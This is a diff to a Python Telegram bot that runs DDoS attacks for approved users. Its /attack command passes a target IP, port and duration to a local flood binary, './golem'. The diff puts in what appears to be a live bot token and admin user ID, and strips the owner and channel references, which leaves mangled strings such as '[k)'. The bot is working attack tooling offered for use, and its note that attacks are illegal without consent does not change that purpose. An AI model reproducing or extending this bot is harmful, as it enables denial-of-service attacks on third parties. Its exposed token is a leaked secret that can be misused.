@@ -2,8 +2,8 @@ import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = 'your bot token 🖕'
-ADMIN_USER_ID = 1234567890
+TELEGRAM_BOT_TOKEN = '7861667002:AAFJztFKLX0KUe2mIm13xmaX3ZQpqKew_nE'
+ADMIN_USER_ID = 5486683891
 USERS_FILE = 'users.txt'
 attack_in_progress = False
 
@@ -30,8 +30,8 @@ async def start(update: Update, context: CallbackContext):
         "*➤ /remove <user_id>  ➔ Remove a user from DDOS attack usage (Admin Only) ⚠️*\n"
         "*➤ /attack <ip> <port> <time> ➔ Launch a DDOS attack (Approved Users Only) 💥*\n"
         "*➤ /help ➔ Display detailed usage instructions for this bot 🧑‍💻*\n\n"
-        "*💬 Owner: @GODxAloneboy*\n"
-        "*📢 Channel: [GODxCHEATS Channel](https://t.me/+03wLVBPurPk2NWRl)*"
+        "*💬 Owner: *\n"
+        "*📢 Channel: [k)*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -47,9 +47,9 @@ async def help_command(update: Update, context: CallbackContext):
         "*⚠️ Important Notes:*\n"
         "*1. Only approved users can launch attacks.*\n"
         "*2. Use responsibly and with permission, DDoS attacks are illegal without consent.*\n"
-        "*3. Contact the bot owner @GODxAloneBOY for assistance or clarifications.*\n\n"
-        "*⚡ Owner: @GODxAloneboy*\n"
-        "*📢 Channel: [GODxCHEATS Channel](https://t.me/+03wLVBPurPk2NWRl)*"
+        "*3. Contact the bot owner  for assistance or clarifications.*\n\n"
+        "*⚡ Owner: y*\n"
+        "*📢 Channel: [k)*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -58,7 +58,7 @@ async def approve(update: Update, context: CallbackContext):
     args = context.args
 
     if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to get permission to use this command. Contact @GODxAloneBOY.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to get permission to use this command. Contact .*", parse_mode='Markdown')
         return
 
     if len(args) != 1:
@@ -75,7 +75,7 @@ async def remove(update: Update, context: CallbackContext):
     args = context.args
 
     if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to get permission to use this command. Contact @GODxAloneBOY.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to get permission to use this command. Contact .*", parse_mode='Markdown')
         return
 
     if len(args) != 1:
@@ -93,7 +93,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./ALONEPAPA {ip} {port} {time} 900",
+            f"./golem {ip} {port} {time} 300",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -127,7 +127,7 @@ async def attack(update: Update, context: CallbackContext):
     args = context.args
 
     if user_id not in users:
-        await context.bot.send_message(chat_id=chat_id, text="*🤡 You need to get permission to use this bot. Contact owner @GODxAloneBOY.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🤡 You need to get permission to use this bot. Contact owner .*", parse_mode='Markdown')
         return
 
     if len(args) != 3:
